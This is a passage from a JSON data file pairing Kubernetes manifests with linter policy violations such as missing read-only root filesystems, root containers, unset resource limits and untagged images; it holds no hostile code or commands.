    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: daimler_merge\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: daimler_merge\n  template:\n    metadata:\n      labels:\n        app: daimler_merge\n    spec:\n      containers:\n      - name: beelogger-service\n        image: mschlech/daimler_merge:1.0.0\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 15\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /readiness\n            port: 3000\n            scheme: HTTP\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"beelogger-service\" has memory limit 0"
  },
  {
    "id": "10372",
    "manifest_path": "data/manifests/the_stack_sample/sample_3994.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: clouds-api\n  name: clouds-api\nspec:\n  type: ClusterIP\n  ports:\n  - protocol: TCP\n    port: 8080\n    targetPort: 8080\n  selector:\n    app: clouds-api\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:clouds-api])"
  },
  {
    "id": "10373",
    "manifest_path": "data/manifests/the_stack_sample/sample_3997.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 2.0.0-beta\n  name: kube-state-metrics\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 2.0.0-beta\n    spec:\n      containers:\n      - image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0-beta\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        name: kube-state-metrics\n        ports:\n        - containerPort: 8080\n          name: http-metrics\n        - containerPort: 8081\n          name: telemetry\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        securityContext:\n          runAsUser: 65534\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-state-metrics\" does not have a read-only root file system"
  },
  {
    "id": "10374",
    "manifest_path": "data/manifests/the_stack_sample/sample_3997.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 2.0.0-beta\n  name: kube-state-metrics\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 2.0.0-beta\n    spec:\n      containers:\n      - image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0-beta\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        name: kube-state-metrics\n        ports:\n        - containerPort: 8080\n          name: http-metrics\n        - containerPort: 8081\n          name: telemetry\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        securityContext:\n          runAsUser: 65534\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"kube-state-metrics\" not found"
  },
  {
    "id": "10375",
    "manifest_path": "data/manifests/the_stack_sample/sample_3997.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 2.0.0-beta\n  name: kube-state-metrics\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 2.0.0-beta\n    spec:\n      containers:\n      - image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0-beta\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        name: kube-state-metrics\n        ports:\n        - containerPort: 8080\n          name: http-metrics\n        - containerPort: 8081\n          name: telemetry\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        securityContext:\n          runAsUser: 65534\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kube-state-metrics\" has cpu request 0"
  },
  {
    "id": "10376",
    "manifest_path": "data/manifests/the_stack_sample/sample_3997.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 2.0.0-beta\n  name: kube-state-metrics\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 2.0.0-beta\n    spec:\n      containers:\n      - image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0-beta\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        name: kube-state-metrics\n        ports:\n        - containerPort: 8080\n          name: http-metrics\n        - containerPort: 8081\n          name: telemetry\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        securityContext:\n          runAsUser: 65534\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-state-metrics\" has memory limit 0"
  },
  {
    "id": "10377",
    "manifest_path": "data/manifests/the_stack_sample/sample_3998.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: test-pod\n    image: gcr.io/google_containers/busybox:1.24\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - touch /mnt/SUCCESS && exit 0 || exit 1\n    volumeMounts:\n    - name: pvc\n      mountPath: /mnt\n  volumes:\n  - name: pvc\n    persistentVolumeClaim:\n      claimName: claim1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test-pod\" does not have a read-only root file system"
  },
  {
    "id": "10378",
    "manifest_path": "data/manifests/the_stack_sample/sample_3998.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: test-pod\n    image: gcr.io/google_containers/busybox:1.24\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - touch /mnt/SUCCESS && exit 0 || exit 1\n    volumeMounts:\n    - name: pvc\n      mountPath: /mnt\n  volumes:\n  - name: pvc\n    persistentVolumeClaim:\n      claimName: claim1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test-pod\" is not set to runAsNonRoot"
  },
  {
    "id": "10379",
    "manifest_path": "data/manifests/the_stack_sample/sample_3998.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: test-pod\n    image: gcr.io/google_containers/busybox:1.24\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - touch /mnt/SUCCESS && exit 0 || exit 1\n    volumeMounts:\n    - name: pvc\n      mountPath: /mnt\n  volumes:\n  - name: pvc\n    persistentVolumeClaim:\n      claimName: claim1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"test-pod\" has cpu request 0"
  },
  {
    "id": "10380",
    "manifest_path": "data/manifests/the_stack_sample/sample_3998.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: test-pod\n    image: gcr.io/google_containers/busybox:1.24\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - touch /mnt/SUCCESS && exit 0 || exit 1\n    volumeMounts:\n    - name: pvc\n      mountPath: /mnt\n  volumes:\n  - name: pvc\n    persistentVolumeClaim:\n      claimName: claim1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"test-pod\" has memory limit 0"
  },
  {
    "id": "10381",
    "manifest_path": "data/manifests/the_stack_sample/sample_4001.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20211124-6dd7957a3a\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cherrypicker\" does not have a read-only root file system"
  },
  {
    "id": "10382",
    "manifest_path": "data/manifests/the_stack_sample/sample_4001.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20211124-6dd7957a3a\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cherrypicker\" is not set to runAsNonRoot"
  },
  {
    "id": "10383",
    "manifest_path": "data/manifests/the_stack_sample/sample_4001.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20211124-6dd7957a3a\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cherrypicker\" has cpu request 0"
  },
  {
    "id": "10384",
    "manifest_path": "data/manifests/the_stack_sample/sample_4001.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20211124-6dd7957a3a\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cherrypicker\" has memory limit 0"
  },
  {
    "id": "10385",
    "manifest_path": "data/manifests/the_stack_sample/sample_4003.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: gol-dev\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: gol\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: gol\n        env: dev\n    spec:\n      containers:\n      - image: learningthoughts/gameoflife:01\n        name: gol-dev\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10386",
    "manifest_path": "data/manifests/the_stack_sample/sample_4003.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: gol-dev\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: gol\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: gol\n        env: dev\n    spec:\n      containers:\n      - image: learningthoughts/gameoflife:01\n        name: gol-dev\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"gol-dev\" does not have a read-only root file system"
  },
  {
    "id": "10387",
    "manifest_path": "data/manifests/the_stack_sample/sample_4003.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: gol-dev\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: gol\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: gol\n        env: dev\n    spec:\n      containers:\n      - image: learningthoughts/gameoflife:01\n        name: gol-dev\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"gol-dev\" is not set to runAsNonRoot"
  },
  {
    "id": "10388",
    "manifest_path": "data/manifests/the_stack_sample/sample_4003.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: gol-dev\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: gol\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: gol\n        env: dev\n    spec:\n      containers:\n      - image: learningthoughts/gameoflife:01\n        name: gol-dev\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"gol-dev\" has cpu request 0"
  },
  {
    "id": "10389",
    "manifest_path": "data/manifests/the_stack_sample/sample_4003.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: gol-dev\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: gol\n      env: dev\n  template:\n    metadata:\n      labels:\n        app: gol\n        env: dev\n    spec:\n      containers:\n      - image: learningthoughts/gameoflife:01\n        name: gol-dev\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"gol-dev\" has memory limit 0"
  },
  {
    "id": "10390",
    "manifest_path": "data/manifests/the_stack_sample/sample_4004.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    letschess.service: userservice\n  name: userservice\n  namespace: letschess\nspec:\n  type: ClusterIP\n  ports:\n  - name: http\n    port: 6001\n    targetPort: 80\n  - name: https\n    port: 6002\n    targetPort: 443\n  selector:\n    letschess.service: userservice\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[letschess.service:userservice])"
  },
  {
    "id": "10391",
    "manifest_path": "data/manifests/the_stack_sample/sample_4006.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: influxdb\n  namespace: speedtest\n  labels:\n    app: influxdb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: influxdb\n  template:\n    metadata:\n      name: speedtest-influxdb\n      labels:\n        app: influxdb\n    spec:\n      containers:\n      - name: influxdb\n        image: influxdb:2.1.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /health\n            port: 8086\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8086\n          name: influxdb\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /health\n            port: 8086\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            memory: 1024Mi\n            cpu: 200m\n          requests:\n            memory: 64Mi\n            cpu: 10m\n        volumeMounts:\n        - name: influxdb-data\n          mountPath: /var/lib/influxdb2\n      volumes:\n      - name: influxdb-data\n        persistentVolumeClaim:\n          claimName: nfs-pvc-speedtest-influxdb\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"influxdb\" does not have a read-only root file system"
  },
  {
    "id": "10392",
    "manifest_path": "data/manifests/the_stack_sample/sample_4006.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: influxdb\n  namespace: speedtest\n  labels:\n    app: influxdb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: influxdb\n  template:\n    metadata:\n      name: speedtest-influxdb\n      labels:\n        app: influxdb\n    spec:\n      containers:\n      - name: influxdb\n        image: influxdb:2.1.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /health\n            port: 8086\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8086\n          name: influxdb\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /health\n            port: 8086\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            memory: 1024Mi\n            cpu: 200m\n          requests:\n            memory: 64Mi\n            cpu: 10m\n        volumeMounts:\n        - name: influxdb-data\n          mountPath: /var/lib/influxdb2\n      volumes:\n      - name: influxdb-data\n        persistentVolumeClaim:\n          claimName: nfs-pvc-speedtest-influxdb\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"influxdb\" is not set to runAsNonRoot"
  },
  {
    "id": "10393",
    "manifest_path": "data/manifests/the_stack_sample/sample_4009.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7080\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10394",
    "manifest_path": "data/manifests/the_stack_sample/sample_4009.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7080\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10395",
    "manifest_path": "data/manifests/the_stack_sample/sample_4009.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7080\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10396",
    "manifest_path": "data/manifests/the_stack_sample/sample_4009.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7080\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10397",
    "manifest_path": "data/manifests/the_stack_sample/sample_4009.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7080\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10398",
    "manifest_path": "data/manifests/the_stack_sample/sample_4010.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mesh-pod-1\n  namespace: foo\n  labels:\n    app.kubernetes.io/name: traefik-mesh\n    app.kubernetes.io/component: proxy\n    app.kubernetes.io/part-of: traefik-mesh\nspec:\n  containers:\n  - name: example\n    image: busybox\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"example\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10399",
    "manifest_path": "data/manifests/the_stack_sample/sample_4010.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mesh-pod-1\n  namespace: foo\n  labels:\n    app.kubernetes.io/name: traefik-mesh\n    app.kubernetes.io/component: proxy\n    app.kubernetes.io/part-of: traefik-mesh\nspec:\n  containers:\n  - name: example\n    image: busybox\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"example\" does not have a read-only root file system"
  },
  {
    "id": "10400",
    "manifest_path": "data/manifests/the_stack_sample/sample_4010.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mesh-pod-1\n  namespace: foo\n  labels:\n    app.kubernetes.io/name: traefik-mesh\n    app.kubernetes.io/component: proxy\n    app.kubernetes.io/part-of: traefik-mesh\nspec:\n  containers:\n  - name: example\n    image: busybox\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"example\" is not set to runAsNonRoot"
  },
  {
    "id": "10401",
    "manifest_path": "data/manifests/the_stack_sample/sample_4010.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mesh-pod-1\n  namespace: foo\n  labels:\n    app.kubernetes.io/name: traefik-mesh\n    app.kubernetes.io/component: proxy\n    app.kubernetes.io/part-of: traefik-mesh\nspec:\n  containers:\n  - name: example\n    image: busybox\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"example\" has cpu request 0"
  },
  {
    "id": "10402",
    "manifest_path": "data/manifests/the_stack_sample/sample_4010.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mesh-pod-1\n  namespace: foo\n  labels:\n    app.kubernetes.io/name: traefik-mesh\n    app.kubernetes.io/component: proxy\n    app.kubernetes.io/part-of: traefik-mesh\nspec:\n  containers:\n  - name: example\n    image: busybox\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"example\" has memory limit 0"
  },
  {
    "id": "10403",
    "manifest_path": "data/manifests/the_stack_sample/sample_4012.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: cron-aaslp-lib-unb-ca\n  namespace: prod\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-aaslp-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: prod\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: aaslp-lib-unb-ca\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cron-aaslp-lib-unb-ca\" is using an invalid container image, \"||DEPLOYMENTIMAGE||\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10404",
    "manifest_path": "data/manifests/the_stack_sample/sample_4012.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: cron-aaslp-lib-unb-ca\n  namespace: prod\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-aaslp-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: prod\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: aaslp-lib-unb-ca\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cron-aaslp-lib-unb-ca\" does not have a read-only root file system"
  },
  {
    "id": "10405",
    "manifest_path": "data/manifests/the_stack_sample/sample_4012.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: cron-aaslp-lib-unb-ca\n  namespace: prod\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-aaslp-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: prod\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: aaslp-lib-unb-ca\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cron-aaslp-lib-unb-ca\" is not set to runAsNonRoot"
  },
  {
    "id": "10406",
    "manifest_path": "data/manifests/the_stack_sample/sample_4012.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: cron-aaslp-lib-unb-ca\n  namespace: prod\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-aaslp-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: prod\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: aaslp-lib-unb-ca\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cron-aaslp-lib-unb-ca\" has cpu request 0"
  },
  {
    "id": "10407",
    "manifest_path": "data/manifests/the_stack_sample/sample_4012.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: cron-aaslp-lib-unb-ca\n  namespace: prod\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-aaslp-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: prod\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: aaslp-lib-unb-ca\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cron-aaslp-lib-unb-ca\" has memory limit 0"
  },
  {
    "id": "10408",
    "manifest_path": "data/manifests/the_stack_sample/sample_4014.yaml",
